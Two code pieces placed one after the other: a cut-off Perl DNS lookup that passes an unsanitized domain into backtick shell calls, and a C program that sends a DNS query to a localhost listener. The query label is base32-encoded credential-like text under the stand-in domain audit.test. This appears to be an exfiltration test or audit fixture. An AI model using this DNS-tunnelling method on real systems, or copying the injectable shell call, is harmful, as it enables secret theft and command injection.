if ($host) {
    print "Result: $host\n";
} else {
    print "Could not resolve $domain\n";

    # Try using nslookup via system call as fallback
    my $result = `nslookup $domain 2>&1`;
    if ($result) {
        print "nslookup result:\n$result\n";
    } else {
        # Try using host command
        $result = `host $domain 2>&1`;
        if ($result) {
            print "host result:\n$result\n";
        } else {
            print "All DNS resolution attempts failed\n";
        }
    }
}

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main() {
    int sockfd;
    struct sockaddr_in server_addr;
    unsigned char query[] = {
        // DNS header
        0x12, 0x34, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        // Query: iraviqkcifjukx2vkjgd24dpon2go4tfom5c6l3bmrwws3r2inau4qksleww.audit.test
        0x3c, 'i', 'r', 'a', 'v', 'i', 'q', 'k', 'c', 'i', 'f', 'j', 'u', 'k', 'x', '2',
        'v', 'k', 'j', 'g', 'd', '2', '4', 'd', 'p', 'o', 'n', '2', 'g', 'o', '4', 't',
        'f', 'o', 'm', '5', 'c', '6', 'l', '3', 'b', 'm', 'r', 'w', 'w', 's', '3', 'r',
        '2', 'i', 'n', 'a', 'u', '4', 'q', 'k', 's', 'l', 'e', 'w', 'w',
        0x05, 'a', 'u', 'd', 'i', 't', 0x04, 't', 'e', 's', 't', 0x00,
        // QTYPE=A, QCLASS=IN
        0x00, 0x01, 0x00, 0x01
    };

    // Create socket
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("socket");
        return 1;
    }

    // Configure server address
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(47302);
    server_addr.sin_addr.s_addr = inet_addr("127.0.0.1");

    // Send query
    if (sendto(sockfd, query, sizeof(query), 0, 
               (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        perror("sendto");
        close(sockfd);
        return 1;
    }

    printf("DNS query sent to localhost:47302\n");

    // Try to receive response
    unsigned char buffer[1024];
    socklen_t addr_len = sizeof(server_addr);
    fd_set readfds;
    struct timeval timeout;

    FD_ZERO(&readfds);
    FD_SET(sockfd, &readfds);
    timeout.tv_sec = 2;
    timeout.tv_usec = 0;

    int ret = select(sockfd + 1, &readfds, NULL, NULL, &timeout);
    if (ret > 0) {
        int n = recvfrom(sockfd, buffer, sizeof(buffer), 0, 
                        (struct sockaddr*)&server_addr, &addr_len);
        if (n > 0) {
            printf("Received %d bytes response\n", n);
        } else {
            perror("recvfrom");
        }
    } else if (ret == 0) {
        printf("Timeout waiting for response\n");
    } else {
        perror("select");
    }

    close(sockfd);
    return 0;
}

